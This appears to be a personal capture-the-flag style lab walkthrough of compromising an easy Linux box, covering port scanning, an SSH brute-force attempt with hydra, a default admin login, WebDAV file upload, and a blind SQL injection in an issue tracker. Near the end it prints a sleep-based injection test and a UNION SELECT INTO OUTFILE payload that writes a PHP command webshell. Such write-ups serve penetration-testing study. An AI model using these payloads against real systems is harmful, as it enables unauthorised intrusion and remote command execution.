---
Status: Done
OS: Linux
Difficulty: Easy
tags:
  - webdav
  - SQL
Date: 2026-07-26T21:41:00
Owned: 2026-11-11T23:42:00
---

---
# Enumeration
## port scan
rustscan  
![[Pasted image 20260726214211.png]]

nmap scan  
![[Pasted image 20260726215137.png]]

## port 17445
issue tracking page    
![[Pasted image 20260726214446.png]]

we can register, i register as test now we can view users list  
![[Pasted image 20260726220758.png]]

found clinton and dummy  
we can even edit other user password i edited clinton password to test  
after successfully sign-in i don't found anything useful  
## port 30455
![[Pasted image 20260726214629.png]]

found comment so i try  
![[Pasted image 20260726221602.png]]

## port 50080
![[Pasted image 20260726215705.png]]

/cloud from feroxbuster  
![[Pasted image 20260726223021.png]]

logged in with admin:admin  

# Initial foothold
since i can't get anything from those webpage only username clinton and dummy which likely isn't username  

im gonna spary port 22 with user clinton  
```
 hydra -l clinton -P wordlist 192.168.139.147 -t 4 ssh -V
```
nothing  

after logging in found that as admin we could edit file and access it using webdav  
![[Pasted image 20260726223133.png]]

upload revshell.php  ![[Pasted image 20260726223347.png]]

trying to access file on the link  
It was not execute   
![[Pasted image 20261111215656.png]]

I then tried to exucute the file using curl request  
```sh
curl http://192.168.114.147:50080/cloud/remote.php/dav/files/admin/revshell.php -u admin:admin
```

it also just load the content  
![[Pasted image 20261111221050.png]]

## Source Code
let's get the issuetracker.zip in case there is anything in the code  
to access webdav we can use client in kali which is cadaver  
```sh
cadaver http://192.168.114.147:50080/cloud/remote.php/dav/files/admin/
```
![[Pasted image 20261111221612.png]]

```
unzip issuetracker.zip
```
![[Pasted image 20261111221720.png]]

# SQL injection
from the code here `/issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java`
there is possible of sql injection vuln here 
![[Pasted image 20261111223808.png]]

the issuestracker is the web on port 17445  
on the site after register and signed in we can add issue  
![[Pasted image 20261111222329.png]]

from the source code we suspect sql injection in the priority field, so let's test  
first I tried adding issue with sql comment as priority there was no error  
read the code again and the endpoint is `issue/checkbypriority`
with the request param `priority` 
so we need to test `issue/checkbypriority?priority=Normal`
>Note: the endpoint is case sensitive  

here instead of not found, it shows error Method Not Allowed  
![[Pasted image 20261111223251.png]]

we gotta try again with different method  
let's use burp  

changed the method to POST and it works  
![[Pasted image 20261111223501.png]]

now we want to upload a cmd.php as a webshell  
from the page on port 30455  
![[Pasted image 20261111225225.png]]

we found the directory so we want to upload to `/srv/http/cmd.php`

we can use this option in burp to url encode  
![[Pasted image 20261111232137.png]]

## injection in action
since there was no output reflected on the page, we need to test with blind injection using sleep(5)  
testing with this payload if it works  
```sql
' union select sleep(5); -- 
```

it actually did checkout the respond time, normally it is lower than 100 ms  
![[Pasted image 20261111232513.png]]

use this payload but change the upload path  
![[Pasted image 20261111232947.png]]

```sql
' union select "<?php system($_GET['cmd']); ?>" into outfile "/srv/http/cmd.php"; -- 
```
>earlier I couldn't get the cmd.php there since I forgot the trailing space in the end  

![[Pasted image 20261111232830.png]]

now we can access the webshell 
![[Pasted image 20261111233001.png]]

we could get the flag from here, but in the exam we are required to gain reverse shell I think.  

> I couldn't get the shell, turnout I need to change the port from 80 to 443
> This stuff is very common in exam as well, so make sure to tryout the port
> Best to just use the port that are already open.

443 will works, but here I just use the 17445  
![[Pasted image 20261111234026.png]]

got the shell  
![[Pasted image 20261111234046.png]]

done  
![[Pasted image 20261111234212.png]]
